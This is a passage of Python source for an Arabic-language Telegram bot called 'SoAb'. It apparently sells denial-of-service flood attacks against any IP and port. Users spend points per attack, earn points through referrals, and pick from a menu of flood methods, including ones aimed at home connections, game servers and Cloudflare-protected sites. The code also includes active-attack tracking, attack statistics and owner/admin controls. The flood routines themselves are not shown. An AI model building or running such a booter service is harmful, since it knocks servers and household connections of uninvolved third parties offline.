                    self.bot.reply_to(message, f" الهدف `{target}` محمي بالفعل.", parse_mode="Markdown")
                else:
                    protected_list.append(target)
                    self.save_protected_targets(protected_list)
                    self.bot.reply_to(message, f" تم إضافة الهدف `{target}` إلى قائمة الحماية بنجاح.", parse_mode="Markdown")
            except Exception as e:
                logger.error(f"خطأ في أمر dad: {e}")
                try:
                    self.bot.reply_to(message, " حدث خطأ أثناء معالجة الأمر.")
                except:
                    pass

        @self.bot.message_handler(commands=['add'])
        def unprotect_target(message):
            try:
                if not self.is_owner(message.from_user.id):
                    self.bot.reply_to(message, " هذا الأمر مخصص للمطورين فقط!")
                    return
                parts = message.text.split()
                if len(parts) != 3:
                    self.bot.reply_to(message, " صيغة الأمر خاطئة. استخدم:\n`/add IP PORT`", parse_mode="Markdown")
                    return
                _, ip, port = parts
                target = f"{ip}:{port}"
                protected_list = self.get_protected_targets()
                if target in protected_list:
                    protected_list.remove(target)
                    self.save_protected_targets(protected_list)
                    self.bot.reply_to(message, f" تم إزالة الهدف `{target}` من قائمة الحماية.", parse_mode="Markdown")
                else:
                    self.bot.reply_to(message, f" الهدف `{target}` غير موجود في قائمة الحماية أصلاً.", parse_mode="Markdown")
            except Exception as e:
                logger.error(f"خطأ في أمر add: {e}")
                try:
                    self.bot.reply_to(message, " حدث خطأ أثناء معالجة الأمر.")
                except:
                    pass

        @self.bot.message_handler(commands=['active'])
        def active_attacks_handler(message):
            try:
                if self.is_admin(message.from_user.id) or self.is_subscribed(str(message.from_user.id)):
                    active_list = []
                    current_time = time.time()
                    for attack_id, data in list(self.active_attacks.items()):
                        if current_time > data['end_time']:
                            del self.active_attacks[attack_id]
                            continue
                        remaining = int(data['end_time'] - current_time)
                        active_list.append(
                            f" الهدف: {data['host']}:{data['port']}\n"
                            f" الوقت المتبقي: {remaining} ثانية\n"
                            f" الطريقة: {data['method']}"
                        )
                    if active_list:
                        response = " الهجمات النشطة حالياً:\n\n" + "\n\n".join(active_list)
                        self.bot.reply_to(message, response)
                    else:
                        self.bot.reply_to(message, " لا توجد هجمات نشطة حالياً.")
                else:
                    self.bot.reply_to(message, " ليس لديك صلاحية لاستخدام هذا الأمر!")
            except Exception as e:
                logger.error(f"خطأ في أمر active: {e}")
                try:
                    self.bot.reply_to(message, " حدث خطأ أثناء عرض الهجمات النشطة.")
                except:
                    pass

        @self.bot.message_handler(commands=['add_admin'])
        def add_admin(message):
            try:
                if self.is_owner(message.from_user.id):
                    msg = self.bot.reply_to(message, " أرسل آيدي المستخدم لرفعه إلى رتبة أدمن:")
                    self.bot.register_next_step_handler(msg, self.process_add_admin)
                else:
                    self.bot.reply_to(message, " هذا الأمر مخصص للمطورين فقط!")
            except Exception as e:
                logger.error(f"خطأ في أمر add_admin: {e}")

        @self.bot.message_handler(commands=['remove_admin'])
        def remove_admin(message):
            try:
                if self.is_owner(message.from_user.id):
                    admins = self.get_admins()
                    if admins:
                        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True)
                        for admin in admins:
                            markup.add(admin)
                        msg = self.bot.reply_to(message, " اختر آيدي الأدمن الذي تريد حذفه:", reply_markup=markup)
                        self.bot.register_next_step_handler(msg, self.process_remove_admin)
                    else:
                        self.bot.reply_to(message, "ℹ لا يوجد أدمنية مسجلون حالياً.")
                else:
                    self.bot.reply_to(message, " هذا الأمر مخصص للمطورين فقط!")
            except Exception as e:
                logger.error(f"خطأ في أمر remove_admin: {e}")

        @self.bot.message_handler(commands=['add_owner'])
        def add_owner(message):
            try:
                if self.is_owner(message.from_user.id):
                    msg = self.bot.reply_to(message, " أرسل آيدي المستخدم لرفعه إلى رتبة مطور:")
                    self.bot.register_next_step_handler(msg, self.process_add_owner)
                else:
                    self.bot.reply_to(message, " هذا الأمر مخصص للمطورين فقط!")
            except Exception as e:
                logger.error(f"خطأ في أمر add_owner: {e}")

        @self.bot.message_handler(commands=['remove_owner'])
        def remove_owner(message):
            try:
                if self.is_owner(message.from_user.id):
                    owners = self.get_owners()
                    if len(owners) > 1:
                        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True)
                        for owner in owners:
                            if owner != str(message.from_user.id):
                                markup.add(owner)
                        msg = self.bot.reply_to(message, " اختر آيدي المطور الذي تريد حذفه:", reply_markup=markup)
                        self.bot.register_next_step_handler(msg, self.process_remove_owner)
                    else:
                        self.bot.reply_to(message, " لا يمكنك حذف آخر مطور متبقٍ!")
                else:
                    self.bot.reply_to(message, " هذا الأمر مخصص للمطورين فقط!")
            except Exception as e:
                logger.error(f"خطأ في أمر remove_owner: {e}")

        @self.bot.message_handler(commands=['list_admins'])
        def list_admins(message):
            try:
                if self.is_admin(message.from_user.id):
                    owners = self.get_owners()
                    admins = self.get_admins()
                    response = " **المطورون:**\n" + "\n".join([f" - `{id}`" for id in owners]) + "\n\n"
                    response += " **الأدمنية:**\n" + "\n".join([f" - `{id}`" for id in admins])
                    self.bot.reply_to(message, response, parse_mode="Markdown")
            except Exception as e:
                logger.error(f"خطأ في أمر list_admins: {e}")

        @self.bot.message_handler(commands=['list_owners'])
        def list_owners(message):
            try:
                if self.is_owner(message.from_user.id):
                    owners = self.get_owners()
                    response = " قائمة المطورين:\n" + "\n".join([f" - `{id}`" for id in owners])
                    self.bot.reply_to(message, response, parse_mode="Markdown")
                else:
                    self.bot.reply_to(message, " هذا الأمر مخصص للمطورين فقط!")
            except Exception as e:
                logger.error(f"خطأ في أمر list_owners: {e}")

        @self.bot.message_handler(commands=['add_user'])
        def add_user(message):
            try:
                if self.is_owner(message.from_user.id):
                    msg = self.bot.reply_to(message, " أرسل آيدي المستخدم وعدد النقاط بالصيغة:\n`ايدي_المستخدم عدد_النقاط`\n\n**مثال:**\n`123456789 30`", parse_mode="Markdown")
                    self.bot.register_next_step_handler(msg, self.process_add_user)
                else:
                    self.bot.reply_to(message, " هذا الأمر مخصص للمطورين فقط!")
            except Exception as e:
                logger.error(f"خطأ في أمر add_user: {e}")

        @self.bot.message_handler(commands=['list_users'])
        def list_users(message):
            try:
                if self.is_owner(message.from_user.id):
                    users = self.get_users()
                    if users:
                        response = " قائمة المشتركين:\n"
                        for user_id, data in users.items():
                            pts = data.get('points', 0) if isinstance(data, dict) else 0
                            response += f" `{user_id}`   {pts} نقطة\n"
                        self.bot.reply_to(message, response, parse_mode="Markdown")
                    else:
                        self.bot.reply_to(message, "ℹ لا يوجد مشتركين مسجلون حالياً.")
                else:
                    self.bot.reply_to(message, " هذا الأمر مخصص للمطورين فقط!")
            except Exception as e:
                logger.error(f"خطأ في أمر list_users: {e}")

        @self.bot.message_handler(commands=["methods"])
        def show_methods(message):
            try:
                user_id = str(message.from_user.id)
                if not (self.is_admin(message.from_user.id) or self.is_subscribed(user_id)):
                    self.bot.reply_to(message, "ليس لديك صلاحية!")
                    return
                msg = (
                    "```\n"
                    "[ BASIC METHODS ]\n"
                    "Dns       | قوة: 6\n"
                    "Udpmix    | قوة: 6\n"
                    "Pps       | قوة: 6\n"
                    "Gre-udp   | قوة: 6\n"
                    "Ack       | قوة: 6\n"
                    "Tcpmix    | قوة: 6\n"
                    "Tls       | قوة: 2\n"
                    "Http      | قوة: 2\n"
                    "Cloudflare| قوة: 2\n"
                    "Browser   | قوة: 2\n\n"
                    "[ VIP METHODS ]\n"
                    "Hudp      | قوة: 8\n"
                    "Udp-pps   | قوة: 8\n"
                    "Udpbypass | قوة: 8\n"
                    "Vse       | قوة: 8\n"
                    "Tcpbypass | قوة: 8\n"
                    "Socket    | قوة: 8\n"
                    "Game      | قوة: 8\n"
                    "Dayz      | قوة: 8\n"
                    "Fort      | قوة: 8\n"
                    "Fivem     | قوة: 8\n"
                    "Fivem-udp | قوة: 8\n"
                    "Tcp-ovh   | قوة: 8\n"
                    "Udp-ovh   | قوة: 8\n"
                    "Home-udp  | قوة: 4\n"
                    "Home-tcp  | قوة: 4\n"
                    "Flooder   | قوة: 2\n"
                    "Mass-flood| قوة: 2\n"
                    "Browserv2 | قوة: 2\n"
                    "Bypass    | قوة: 2\n"
                    "Overload  | قوة: 2\n"
                    "```\n"
                    "مثال: `Hudp 1.1.1.1 80 60`"
                )
                back_markup = types.InlineKeyboardMarkup()
                back_markup.row(
                    types.InlineKeyboardButton("رجوع", callback_data="cmd_back", style="danger"),
                )
                self.bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=back_markup)
            except Exception as e:
                logger.error(f"خطأ في أمر methods: {e}")

        @self.bot.message_handler(commands=['points'])
        def cmd_points(message):
            try:
                uid = str(message.from_user.id)
                if self.is_owner(message.from_user.id) or self.is_admin(message.from_user.id):
                    self.bot.reply_to(message, "[ نقاطك ]\n\nانت مدير - لا تحتاج نقاط.")
                    return
                pts = self.get_user_points(uid)
                me = self.bot.get_me()
                invite_link = f"https://t.me/{me.username}?start=ref_{uid}"
                d = self.get_user_data(uid)
                invites = d.get('invites', 0) if d else 0
                resp = (
                    "[ نقاطك ]\n\n"
                    f"الرصيد : {pts} نقطة\n"
                    f"دعوات  : {invites} عضو\n\n"
                    f"رابط الدعوة :\n{invite_link}"
                )
                self.bot.reply_to(message, resp)
            except Exception as e:
                logger.error(f"خطأ /points: {e}")

        @self.bot.message_handler(commands=['invite'])
        def cmd_invite(message):
            try:
                uid = str(message.from_user.id)
                me = self.bot.get_me()
                invite_link = f"https://t.me/{me.username}?start=ref_{uid}"
                d = self.get_user_data(uid)
                invites = d.get('invites', 0) if d else 0
                pts = self.get_user_points(uid)
                resp = (
                    "[ رابط الدعوة ]\n\n"
                    f"{invite_link}\n\n"
                    f"كل عضو يدخل عبر رابطك = نقطة اضافية\n"
                    f"دعواتك : {invites} | نقاطك : {pts}"
                )
                self.bot.reply_to(message, resp)
            except Exception as e:
                logger.error(f"خطأ /invite: {e}")

        @self.bot.callback_query_handler(func=lambda call: call.data == "cmd_check_sub")
        def handle_check_sub(call):
            try:
                uid = call.from_user.id
                subscribed, not_joined = self.check_user_subscription(uid)
                if subscribed:
                    self.bot.answer_callback_query(call.id, "تم التحقق — انت مشترك في كل القنوات", show_alert=True)
                    me = self.bot.get_me()
                    str_uid = str(uid)
                    invite_link = f"https://t.me/{me.username}?start=ref_{str_uid}"
                    share_url = f"https://t.me/share/url?url={invite_link}&text=انضم+معي+في+بوت+SoAb"
                    pts = self.get_user_points(str_uid)
                    welcome_msg = (
                        "<blockquote>[ SoAb ] — عضو</blockquote>\n\n"
                        f"نقاطك        : {pts}\n\n"
                        "الصيغة :\n"
                        "<code>METHOD IP PORT TIME</code>"
                    )
                    mk = types.InlineKeyboardMarkup()
                    mk.row(
                        types.InlineKeyboardButton("الهجمات النشطة", callback_data="cmd_active", style="primary"),
                        types.InlineKeyboardButton("الطرق المتاحة", callback_data="cmd_methods", style="primary"),
                    )
                    mk.row(
                        types.InlineKeyboardButton("مشاركة رابط الدعوة", url=share_url, style="success"),
                        types.InlineKeyboardButton("نسخ رابط الدعوة", callback_data=f"copy_invite_{str_uid}", style="success"),
                    )
                    mk.row(
                        types.InlineKeyboardButton("طريقة الاستعمال", callback_data="cmd_guide", style="primary"),
                    )
                    mk.row(types.InlineKeyboardButton("المطور سجين", url="https://t.me/A0_XX", style="primary"))
                    self.bot.send_message(call.message.chat.id, welcome_msg, parse_mode="HTML", reply_markup=mk)
                else:
                    self.bot.answer_callback_query(call.id, "لم تشترك في كل القنوات بعد", show_alert=True)
            except Exception as e:
                logger.error(f"خطأ check_sub: {e}")

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith("copy_invite_"))
        def handle_copy_invite(call):
            try:
                uid = call.data.replace("copy_invite_", "")
                me = self.bot.get_me()
                invite_link = f"https://t.me/{me.username}?start=ref_{uid}"
                self.bot.answer_callback_query(call.id, "تم! انسخ الرابط من الرسالة", show_alert=False)
                self.bot.send_message(call.message.chat.id, invite_link)
            except Exception as e:
                logger.error(f"خطأ copy_invite: {e}")

        @self.bot.callback_query_handler(func=lambda call: call.data == "broadcast_cancel")
        def handle_broadcast_cancel(call):
            try:
                self.bot.answer_callback_query(call.id, "تم الالغاء", show_alert=True)
                self.bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
            except Exception as e:
                logger.error(f"خطأ broadcast_cancel: {e}")

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith("broadcast_confirm_"))
        def handle_broadcast_confirm(call):
            try:
                if not self.is_owner(call.from_user.id):
                    self.bot.answer_callback_query(call.id, "ليس لديك صلاحية!", show_alert=True)
                    return
                self.bot.answer_callback_query(call.id)
                self.bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
                parts = call.data.replace("broadcast_confirm_", "").split("_")
                src_chat_id = int(parts[0])
                src_msg_id = int(parts[1])
                users = self.get_users()
                success = 0
                failed = 0
                for uid in users.keys():
                    try:
                        self.bot.copy_message(uid, src_chat_id, src_msg_id)
                        success += 1
                    except:
                        failed += 1
                self.bot.send_message(call.message.chat.id,
                    f"[ تمت الاذاعة ]\n\n"
                    f"تم الارسال : {success}\n"
                    f"فشل الارسال : {failed}"
                )
            except Exception as e:
                logger.error(f"خطأ broadcast_confirm: {e}")

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith("cmd_"))
        def handle_cmd_buttons(call):
            try:
                cmd = call.data.replace("cmd_", "")
                self.bot.answer_callback_query(call.id)
                call.message.from_user = call.from_user
                if cmd == "active":
                    active_list = []
                    current_time = time.time()
                    for attack_id, data in list(self.active_attacks.items()):
                        if current_time > data["end_time"]:
                            del self.active_attacks[attack_id]
                            continue
                        remaining = int(data["end_time"] - current_time)
                        active_list.append(
                            f"الهدف : {data['host']}:{data['port']}\n"
                            f"الطريقة : {data['method']}\n"
                            f"متبقي : {remaining} ثانية\n"
                            "―――――――――――――――"
                        )
                    if active_list:
                        resp = "[ الهجمات النشطة ]\n\n" + "\n".join(active_list)
                    else:
                        resp = "[ الهجمات النشطة ]\n\nلا توجد هجمات نشطة حالياً."
                    back_mk = types.InlineKeyboardMarkup()
                    back_mk.row(types.InlineKeyboardButton("رجوع", callback_data="cmd_back", style="danger"))
                    self.bot.send_message(call.message.chat.id, resp, reply_markup=back_mk)
                elif cmd == "channels":
                    if not self.is_owner(call.from_user.id):
                        self.bot.answer_callback_query(call.id, "ليس لديك صلاحية!")
                        return
                    chs = self.get_channels()
                    ch_list = "\n".join([f"  {i+1}. {c}" for i, c in enumerate(chs)]) if chs else "  لا توجد قنوات مضافة"
                    ch_mk = types.InlineKeyboardMarkup()
                    ch_mk.row(
                        types.InlineKeyboardButton("اضافة قناة", callback_data="cmd_add_channel", style="success"),
                        types.InlineKeyboardButton("حذف قناة", callback_data="cmd_del_channel", style="danger"),
                    )
                    ch_mk.row(types.InlineKeyboardButton("رجوع", callback_data="cmd_back", style="danger"))
                    self.bot.send_message(
                        call.message.chat.id,
                        f"[ الاشتراك الاجباري ]\n\nالقنوات المضافة :\n{ch_list}",
                        reply_markup=ch_mk
                    )
                elif cmd == "add_channel":
                    if not self.is_owner(call.from_user.id):
                        return
                    msg = self.bot.send_message(
                        call.message.chat.id,
                        "[ اضافة قناة ]\n\nارسل يوزر القناة او الآيدي :\nمثال: @mychannel او -1001234567890\n\nتاكد ان البوت مشرف في القناة"
                    )
                    def process_add_channel(m):
                        ch = m.text.strip()
                        chs = self.get_channels()
                        if ch in chs:
                            self.bot.reply_to(m, "القناة موجودة بالفعل.")
                            return
                        try:
                            self.bot.get_chat(ch)
                        except Exception:
                            self.bot.reply_to(m, "لم يتم العثور على القناة. تاكد ان البوت مشرف فيها.")
                            return
                        chs.append(ch)
                        self.save_channels(chs)
                        back_mk = types.InlineKeyboardMarkup()
                        back_mk.row(types.InlineKeyboardButton("رجوع", callback_data="cmd_channels", style="danger"))
                        self.bot.reply_to(m, f"[ تم ]\n\nتم اضافة القناة : {ch}", reply_markup=back_mk)
                    self.bot.register_next_step_handler(msg, process_add_channel)
                elif cmd == "del_channel":
                    if not self.is_owner(call.from_user.id):
                        return
                    chs = self.get_channels()
                    if not chs:
                        self.bot.send_message(call.message.chat.id, "لا توجد قنوات لحذفها.")
                        return
                    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
                    for ch in chs:
                        markup.add(ch)
                    msg = self.bot.send_message(call.message.chat.id, "[ حذف قناة ]\n\nاختر القناة للحذف:", reply_markup=markup)
                    def process_del_channel(m):
                        ch = m.text.strip()
                        chs2 = self.get_channels()
                        if ch in chs2:
                            chs2.remove(ch)
                            self.save_channels(chs2)
                            back_mk = types.InlineKeyboardMarkup()
                            back_mk.row(types.InlineKeyboardButton("رجوع", callback_data="cmd_channels", style="danger"))
                            self.bot.reply_to(m, f"[ تم ]\n\nتم حذف القناة : {ch}", reply_markup=back_mk)
                        else:
                            self.bot.reply_to(m, "القناة غير موجودة.")
                    self.bot.register_next_step_handler(msg, process_del_channel)
                elif cmd == "stats":
                    if not self.is_owner(call.from_user.id):
                        self.bot.answer_callback_query(call.id, "ليس لديك صلاحية!")
                        return
                    users = self.get_users()
                    total_users = len(users)
                    active_users = sum(1 for d in users.values() if isinstance(d, dict) and d.get("points", 0) > 0)
                    zero_pts = sum(1 for d in users.values() if isinstance(d, dict) and d.get("points", 0) == 0)
                    total_pts = sum(d.get("points", 0) for d in users.values() if isinstance(d, dict))
                    avg_pts = round(total_pts / total_users, 1) if total_users else 0
                    max_pts = max((d.get("points", 0) for d in users.values() if isinstance(d, dict)), default=0)
                    total_invites = sum(d.get("invites", 0) for d in users.values() if isinstance(d, dict))
                    today = datetime.now().strftime("%Y-%m-%d")
                    new_today = sum(1 for d in users.values() if isinstance(d, dict) and d.get("join_date","") == today)
                    current_time = time.time()
                    active_atk_list = [d for d in self.active_attacks.values() if current_time < d["end_time"]]
                    active_atk_count = len(active_atk_list)
                    total_active_time = sum(int(d["end_time"] - current_time) for d in active_atk_list)
                    total_attacks_ever = self.attack_counter
                    protected_list = self.get_protected_targets()
                    channels = self.get_channels()
                    admins = self.get_admins()
                    owners = self.get_owners()
                    top_inviters = sorted(
                        [(uid, d.get("invites", 0)) for uid, d in users.items() if isinstance(d, dict) and d.get("invites", 0) > 0],
                        key=lambda x: x[1], reverse=True
                    )[:3]
                    top_pts_users = sorted(
                        [(uid, d.get("points", 0)) for uid, d in users.items() if isinstance(d, dict)],
                        key=lambda x: x[1], reverse=True
                    )[:3]
                    top_lines = "\n".join([f"  {uid}  {inv} دعوة" for uid, inv in top_inviters]) if top_inviters else "  لا يوجد"
                    top_pts_lines = "\n".join([f"  {uid}  {pts} نقطة" for uid, pts in top_pts_users]) if top_pts_users else "  لا يوجد"
                    active_methods = list({d["method"] for d in active_atk_list}) if active_atk_list else []
                    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    stats_text = (
                        "<blockquote>"
                        "[ SoAb — إحصائيات البوت ]\n\n"
                        " المستخدمون \n"
                        f"  الإجمالي          : {total_users}\n"
                        f"  لديهم نقاط        : {active_users}\n"
                        f"  رصيد صفر          : {zero_pts}\n"
                        f"  انضموا اليوم      : {new_today}\n\n"
                        " النقاط \n"
                        f"  الإجمالي          : {total_pts}\n"
                        f"  المتوسط           : {avg_pts}\n"
                        f"  أعلى رصيد         : {max_pts}\n\n"
                        " الدعوات \n"
                        f"  إجمالي الدعوات    : {total_invites}\n\n"
                        " أكثر المدعوين \n"
                        f"{top_lines}\n\n"
                        " أعلى النقاط \n"
                        f"{top_pts_lines}\n\n"
                        " الهجمات \n"
                        f"  نشطة الآن         : {active_atk_count} / {self.MAX_CONCURRENT_ATTACKS}\n"
                        f"  ثواني متبقية       : {total_active_time}\n"
                        f"  طرق نشطة          : {', '.join(active_methods) if active_methods else 'لا يوجد'}\n"
                        f"  إجمالي الهجمات    : {total_attacks_ever}\n\n"
                        " الحماية \n"
                        f"  أهداف محمية       : {len(protected_list)}\n\n"
                        " الإعدادات \n"
                        f"  قنوات اجبارية     : {len(channels)}\n"
                        f"  المطورون          : {len(owners)}\n"
                        f"  الأدمنية          : {len(admins)}\n"
                        f"  سعر الهجوم        : 6 نقاط\n"
                        f"  نقاط الدعوة       : 5 نقاط\n"
                        f"  تجديد يومي        : 12 نقطة\n"
                        f"  كولداون           : {self.USER_COOLDOWN_SECONDS} ثانية\n"
                        f"  الحد الأقصى للمدة : {self.MAX_ATTACK_TIME} ثانية\n\n"
                        f"\n"
                        f"  الوقت : {now_str}"
                        "</blockquote>"
                    )
                    stats_mk = types.InlineKeyboardMarkup()
                    stats_mk.row(types.InlineKeyboardButton("رجوع", callback_data="cmd_back", style="danger"))
                    self.bot.send_message(call.message.chat.id, stats_text, parse_mode="HTML", reply_markup=stats_mk)
                elif cmd == "broadcast":
                    if not self.is_owner(call.from_user.id):
                        self.bot.answer_callback_query(call.id, "ليس لديك صلاحية!")
                        return
                    msg = self.bot.send_message(call.message.chat.id, "[ اذاعة رسالة ]\n\nارسل الرسالة التي تريد اذاعتها لجميع المستخدمين:")
                    def process_broadcast(m):
                        total_users = len(self.get_users())
                        confirm_mk = types.InlineKeyboardMarkup()
                        confirm_mk.row(
                            types.InlineKeyboardButton("تاكيد الارسال", callback_data=f"broadcast_confirm_{m.chat.id}_{m.message_id}", style="success"),
                            types.InlineKeyboardButton("الغاء", callback_data="broadcast_cancel", style="danger"),
                        )
                        self.bot.reply_to(m,
                            f"[ تاكيد الاذاعة ]\n\n"
                            f"سيتم ارسال الرسالة لـ {total_users} عضو\n\n"
                            f"هل انت متاكد؟",
                            reply_markup=confirm_mk
                        )
                    self.bot.register_next_step_handler(msg, process_broadcast)
                elif cmd == "back":
                    uid = str(call.from_user.id)
                    me = self.bot.get_me()
                    invite_link = f"https://t.me/{me.username}?start=ref_{uid}"
                    share_url = f"https://t.me/share/url?url={invite_link}&text=انضم+معي+في+بوت+SoAb"
                    pts = self.get_user_points(uid)
                    welcome_msg = (
                        "<blockquote>[ SoAb ] — عضو</blockquote>\n\n"
                        f"نقاطك        : {pts}\n\n"
                        "الصيغة :\n"
                        "<code>METHOD IP PORT TIME</code>"
                    )
                    user_markup = types.InlineKeyboardMarkup()
                    user_markup.row(
                        types.InlineKeyboardButton("الهجمات النشطة", callback_data="cmd_active", style="primary"),
                        types.InlineKeyboardButton("الطرق المتاحة", callback_data="cmd_methods", style="primary"),
                    )
                    user_markup.row(
                        types.InlineKeyboardButton("مشاركة رابط الدعوة", url=share_url, style="success"),
                        types.InlineKeyboardButton("نسخ رابط الدعوة", callback_data=f"copy_invite_{uid}", style="success"),
                    )
                    user_markup.row(
                        types.InlineKeyboardButton("طريقة الاستعمال", callback_data="cmd_guide", style="primary"),
                    )
                    user_markup.row(types.InlineKeyboardButton("المطور سجين", url="https://t.me/A0_XX", style="primary"))
                    self.bot.send_message(call.message.chat.id, welcome_msg, parse_mode="HTML", reply_markup=user_markup)
                elif cmd == "guide":
                    guide_text = (
                        "<blockquote>"
                        "[ SoAb — طريقة الاستعمال ]\n\n"
                        "اكتب الهجوم بهذه الصيغة :\n"
                        "METHOD IP PORT TIME\n\n"
                        "مثال :\n"
                        "Udp 1.1.1.1 80 60\n\n"
                        "\n\n"
                        "[ النقاط والاسعار ]\n\n"
                        f"الحد الاقصى للمدة  : {self.MAX_ATTACK_TIME} ثانية\n"
                        "سعر الهجوم الواحد  : 6 نقاط\n"
                        "دعوة عضو جديد      : 5 نقاط\n"
                        "تجديد يومي تلقائي  : 12 نقطة\n\n"
                        "\n\n"
                        "[ الطرق المتاحة ]\n\n"
                        "BASIC : Dns / Udpmix / Pps / Gre-udp\n"
                        "        Ack / Tcpmix / Tls / Http\n"
                        "        Cloudflare / Browser\n\n"
                        "VIP   : Hudp / Udp-pps / Udpbypass / Vse\n"
                        "        Tcpbypass / Socket / Game / Dayz\n"
                        "        Fort / Fivem / Fivem-udp / Tcp-ovh\n"
                        "        Udp-ovh / Home-udp / Home-tcp\n"
                        "        Flooder / Mass-flood / Browserv2\n"
                        "        Bypass / Overload\n\n"
                        "\n\n"
                        "[ ملاحظات ]\n\n"
                        "- تاكد من صحة الـ IP والبورت\n"
                        "- البورت يجب ان يكون بين 1 و 65535\n"
                        "- المدة لا تتجاوز 160 ثانية\n"
                        "- لا يمكن الهجوم على الاهداف المحمية"
                        "</blockquote>"
                    )
                    back_mk = types.InlineKeyboardMarkup()
                    back_mk.row(
                        types.InlineKeyboardButton("المطور سجين", url="https://t.me/A0_XX", style="primary"),
                        types.InlineKeyboardButton("قناة المطور", url="https://t.me/X_I_I_1", style="primary"),
                    )
                    back_mk.row(types.InlineKeyboardButton("رجوع", callback_data="cmd_back", style="danger"))
                    self.bot.send_message(call.message.chat.id, guide_text, parse_mode="HTML", reply_markup=back_mk)
                elif cmd == "methods":
                    uid_c = str(call.from_user.id)
                    if not (self.is_admin(call.from_user.id) or self.is_subscribed(uid_c)):
                        self.bot.answer_callback_query(call.id, "ليس لديك صلاحية!")
                        return
                    msg_text = (
                        "```\n"
                        "[ BASIC METHODS ]\n"
                        "Dns / Udpmix / Pps / Gre-udp\n"
                        "Ack / Tcpmix / Tls / Http\n"
                        "Cloudflare / Browser\n\n"
                        "[ VIP METHODS ]\n"
                        "Hudp / Udp-pps / Udpbypass / Vse\n"
                        "Tcpbypass / Socket / Game / Dayz\n"
                        "Fort / Fivem / Fivem-udp / Tcp-ovh\n"
                        "Udp-ovh / Home-udp / Home-tcp\n"
                        "Flooder / Mass-flood / Browserv2\n"
                        "Bypass / Overload\n"
                        "```\n"
                        "مثال: `Hudp 1.1.1.1 80 60`"
                    )
                    back_mk = types.InlineKeyboardMarkup()
                    back_mk.row(types.InlineKeyboardButton("رجوع", callback_data="cmd_back", style="danger"))
                    self.bot.send_message(call.message.chat.id, msg_text, parse_mode="Markdown", reply_markup=back_mk)
                elif cmd == "list_users":
                    if not self.is_owner(call.from_user.id):
                        self.bot.answer_callback_query(call.id, "ليس لديك صلاحية!")
                        return
                    users = self.get_users()
                    if users:
                        response = " قائمة المشتركين:\n"
                        for uid_u, data in users.items():
                            pts = data.get('points', 0) if isinstance(data, dict) else 0
                            response += f" `{uid_u}`   {pts} نقطة\n"
                        self.bot.send_message(call.message.chat.id, response, parse_mode="Markdown")
                    else:
                        self.bot.send_message(call.message.chat.id, "لا يوجد مشتركين.")
                elif cmd == "list_admins":
                    owners = self.get_owners()
                    admins = self.get_admins()
                    resp = " المطورون:\n" + "\n".join([f" - `{i}`" for i in owners])
                    resp += "\n\n الأدمنية:\n" + "\n".join([f" - `{i}`" for i in admins])
                    self.bot.send_message(call.message.chat.id, resp, parse_mode="Markdown")
                elif cmd == "list_owners":
                    if not self.is_owner(call.from_user.id):
                        return
                    owners = self.get_owners()
                    resp = " قائمة المطورين:\n" + "\n".join([f" - `{i}`" for i in owners])
                    self.bot.send_message(call.message.chat.id, resp, parse_mode="Markdown")
                elif cmd == "bulk_add":
                    if not self.is_owner(call.from_user.id):
                        self.bot.answer_callback_query(call.id, "ليس لديك صلاحية!")
                        return
                    msg = self.bot.send_message(
                        call.message.chat.id,
                        "[ نقاط لكل الاعضاء ]\n\nارسل عدد النقاط المراد اضافتها لكل الاعضاء:"
                    )
                    def process_bulk_add(m):
                        try:
                            pts_to_add = int(m.text.strip())
                            if pts_to_add <= 0:
                                self.bot.reply_to(m, "ارسل عدد صحيح اكبر من صفر.")
                                return
                            users = self.get_users()
                            count = 0
                            for uid_b, data_b in users.items():
                                if isinstance(data_b, dict):
                                    data_b["points"] = data_b.get("points", 0) + pts_to_add
                                    self.save_user_data(uid_b, data_b)
                                    count += 1
                            self.bot.reply_to(m,
                                f"[ تم ]\n\n"
                                f"تم اضافة {pts_to_add} نقطة لـ {count} عضو"
                            )
                            notif_text = (
                                "[ SoAb ]\n\n"
                                f"تم اضافة {pts_to_add} نقطة لجميع الاعضاء من المطور"
                            )
                            threading.Thread(target=self.notify_all_users, args=(notif_text,), daemon=True).start()
                        except ValueError:
                            self.bot.reply_to(m, "ارسل رقم صحيح فقط.")
                        except Exception as ex:
                            logger.error(f"خطأ bulk_add: {ex}")
                            self.bot.reply_to(m, "حدث خطأ.")
                    self.bot.register_next_step_handler(msg, process_bulk_add)
                elif cmd == "reset_user_pts":
                    if not self.is_owner(call.from_user.id):
                        self.bot.answer_callback_query(call.id, "ليس لديك صلاحية!")
                        return
                    msg = self.bot.send_message(
                        call.message.chat.id,
                        "[ راست نقاط عضو ]\n\nارسل آيدي العضو الذي تريد تصفير نقاطه:"
                    )
                    def process_reset_pts(m):
                        try:
                            uid_reset = str(int(m.text.strip()))
                            if self.reset_user_points(uid_reset):
                                try:
                                    self.bot.send_message(int(uid_reset),
                                        "[ SoAb ]\n\n"
                                        "تم تصفير نقاطك من قبل المطور\n"
                                        "رصيدك الحالي : 0 نقطة"
                                    )
                                except:
                                    pass
                                self.bot.reply_to(m, f"[ تم ]\n\nتم تصفير نقاط {uid_reset} بنجاح.")
                            else:
                                self.bot.reply_to(m, "العضو غير موجود أو لا يملك بيانات.")
                        except ValueError:
                            self.bot.reply_to(m, "آيدي غير صحيح.")
                        except Exception as ex:
                            logger.error(f"خطأ reset_pts: {ex}")
                            self.bot.reply_to(m, "حدث خطأ.")
                    self.bot.register_next_step_handler(msg, process_reset_pts)
                elif cmd == "add_admin":
                    msg = self.bot.send_message(call.message.chat.id, "[ اضافة ادمن ]\n\nارسل الآيدي:")
                    self.bot.register_next_step_handler(msg, self.process_add_admin)
                elif cmd == "remove_admin":
                    admins = self.get_admins()
                    if admins:
                        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True)
                        for admin in admins:
                            markup.add(admin)
                        msg = self.bot.send_message(call.message.chat.id, "[ ازالة ادمن ]\n\nاختر الادمن:", reply_markup=markup)
                        self.bot.register_next_step_handler(msg, self.process_remove_admin)
                    else:
